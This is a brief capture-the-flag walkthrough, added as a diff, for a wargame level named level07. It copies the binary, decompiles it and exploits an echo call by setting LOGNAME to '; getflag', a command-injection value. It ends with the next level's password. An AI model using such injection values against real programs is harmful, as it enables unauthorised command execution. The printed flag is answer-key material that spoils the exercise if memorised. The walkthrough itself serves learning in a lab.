@@ -1,0 +1,13 @@
+1. ls -la 
+
+2. scp -P 4243 level07@localhost:/home/user/level07/level07 .
+
+3. https://dogbolt.org => analyse binary in C output
+
+4. we can see echo used with a LOGNAME variable
+
+5. export LOGNAME="; getflag"
+
+6. ./level07
+
+level08: fiumuikeil55xe9cu4dood66h
